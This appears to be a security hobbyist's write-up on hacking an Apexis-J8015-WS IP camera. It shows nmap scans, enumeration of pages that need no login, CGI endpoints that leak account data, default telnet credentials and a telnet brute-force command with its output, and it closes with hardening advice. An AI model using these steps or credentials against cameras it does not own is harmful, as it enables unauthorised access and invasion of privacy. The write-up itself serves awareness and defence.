# Apexis-J8015-WS
> 22-06-2021

## Desctiption
The Apexis-J8015-WS is a cheap PTZ IP-CAMERA(Factory settings)

### I/O

- 5V(continuous) 2A
- Microphone INPUT 2.5mm
- Audio Output 2.5mm
- RP-SMA Female
- 2 GPIO PIN
- 2 "Alarm" PIN
- 1 RJ-45 Ethernet port

## Hacking

### Basic web research
https://seclists.org/fulldisclosure/2017/Mar/23

Default WEB credentials:
- Username: `admin`
- Password: none

### Nmap Scan

#### Host Discovery
Let's run some nmap scans
```bash
nmap -O IP-CAMERA
```
```
MAC Address: 44:33:XX:XX:XX:XX (Shenzhen Bilian electronic)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32
```

#### Port Scanning
```bash
nmap -sC -sV IP-CAMERA
```
```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  BusyBox telnetd
80/tcp open  http    mini_httpd 1.19 19dec2003
|_http-server-header: mini_httpd/1.19 19dec2003
|_http-title: Site doesn't have a title (text/html).
```

### IP-CAMERA Web server

#### Basic enumaration

Using the `ApexisURLEnum.py` script with the `enumlist.txt` we can found some interesting datas!
```bash
python3 ApexisURLEnum.py enumlist.txt IP-CAMERA 80
```
Here are some valid urls that don't requires login
```
[+] http://IP-CAMERA:80/IPCameramon.htm
[+] http://IP-CAMERA:80/lang.js
[+] http://IP-CAMERA:80/alias.htm
[+] http://IP-CAMERA:80/rebootme.htm
[+] http://IP-CAMERA:80/reboot.htm
[+] http://IP-CAMERA:80/get_status.cgi
[+] http://IP-CAMERA:80/recpath.htm
[+] http://IP-CAMERA:80/version_conf
[+] http://IP-CAMERA:80/ddns.htm
[+] http://IP-CAMERA:80/upgrade.htm
[+] http://IP-CAMERA:80/alarm.htm
[+] http://IP-CAMERA:80/upnp.htm
[+] http://IP-CAMERA:80/light.htm
[+] http://IP-CAMERA:80/test_ftp.htm
[+] http://IP-CAMERA:80/status.htm
[+] http://IP-CAMERA:80/IPCameramob.htm
[+] http://IP-CAMERA:80/p2p.htm
[+] http://IP-CAMERA:80/msn.htm
[+] http://IP-CAMERA:80/get_tutk_account.cgi
[+] http://IP-CAMERA:80/backup.htm
[+] http://IP-CAMERA:80/test_mail.htm
[+] http://IP-CAMERA:80/vlc_noplugin.htm
[+] http://IP-CAMERA:80/user.htm
[+] http://IP-CAMERA:80/public.js
[+] http://IP-CAMERA:80/log.htm
[+] http://IP-CAMERA:80/VLC_live.htm
[+] http://IP-CAMERA:80/login.htm
[+] http://IP-CAMERA:80/adsl.htm
[+] http://IP-CAMERA:80/VLC_IPCameralive.htm
[+] http://IP-CAMERA:80/main.htm
[+] http://IP-CAMERA:80/decoder.htm
[+] http://IP-CAMERA:80/mail.htm
[+] http://IP-CAMERA:80/monitor.htm
[+] http://IP-CAMERA:80/IPCameralive.htm
[+] http://IP-CAMERA:80/showocx.js
[+] http://IP-CAMERA:80/live.htm
[+] http://IP-CAMERA:80/ip.htm
[+] http://IP-CAMERA:80/datetime.htm
[+] http://IP-CAMERA:80/multidev.htm
[+] http://IP-CAMERA:80/ptz.htm
[+] http://IP-CAMERA:80/wireless.htm
[+] http://IP-CAMERA:80/ftp.htm
[+] http://IP-CAMERA:80/index.htm
[+] http://IP-CAMERA:80/snapshot.htm
```
#### Informataion Gathering
Now we can see 2 `.cgi` files
```
[+] http://IP-CAMERA:80/get_status.cgi
[+] http://IP-CAMERA:80/get_tutk_account.cgi
```
##### Camera's Informations
```bash
curl http://IP-CAMERA:80/get_status.cgi
```
```
var id='4433XXXXXXXX';
var sys_ver='17.X.X.XX';
var app_ver='30.XX.X.XX';
var alias='IP-CAMERA';
var now=1624537624;
var tz=-3600;
var alarm_status=2;
var ddns_status=29;
var oray_type=0;
var wifi_status=1;
var upnp_status=0;
var msn_status=0;
var ddns_host='XXXX.XXXX.org';
```
##### Possible password leak
```bash
curl http://IP-CAMERA:80/get_tutk_account.cgi
```
```
var ret_tutk_guid='';
var ret_tutk_user='';
var ret_tutk_pwd='000000';
```

### IP-CAMERA Telnet
Now that we have done some research on the IP-CAMERA web server, let's have a look to telnet.

```bash
telnet IP-CAMERA 23
```
```
Trying IP-CAMERA...
Connected to IP-CAMERA.
Escape character is '^]'.

(none) login: 
```

The default telnet credentials for the Apexis-J8015-WS IP camera are:
```
Login: root
Password: 123456
```

But the credentials could be different. Let's do a bit of brute force oin the camera telnet.
```bash
nmap -p 23 --script telnet-brute --script-args userdb=Misc/bruteforce-lists/userlist.txt,passdb=Misc/bruteforce-lists/passlist.txt,telnet-brute.timeout=8s IP-CAMERA
```
```
Host is up (0.0032s latency).

PORT   STATE SERVICE
23/tcp open  telnet
| telnet-brute: 
|   Accounts: 
|     root:123456 - Valid credentials
|_  Statistics: Performed 103 guesses in 33 seconds, average tps: 2.7

Nmap done: 1 IP address (1 host up) scanned in 33.33 seconds
```

## Conslusion (for the moment)
With a bit of **hacking** skills, we now know that the Apexis-J8015-WS is vulnerable!
There is a lots of other things to say about this IP camera like:
- DDNS
- CGI scripts
- Wifi Scanning using the camera(yes, you can...)
- Live stream
- Audio
- Etc...

We have done:
- Information Gathering
- Nmap Scans
- File Enumaration
- Brute Force
  
Using these: leaks, vulnerabilities, and misconfigurations, we now have acces to a IP camera.
This could be dangerous for your privacy or enterprise.
A simple cheap or misconfigured IP camera could become a real weapon!
An attacker could use this camera to enter your network, enter your privacy, and use this device against you.

### How to protect?
- Buy a good quality camera
- Disable all unused features such as: DDNS, WI-FI discovery, Remote access, Telnet, Etc...
- Set strong passwords
- Upgrade your firmware when it's possible
- Use LAN rather than WI-FI when it's possible
- Check logs as often as you can

Thank you for reading!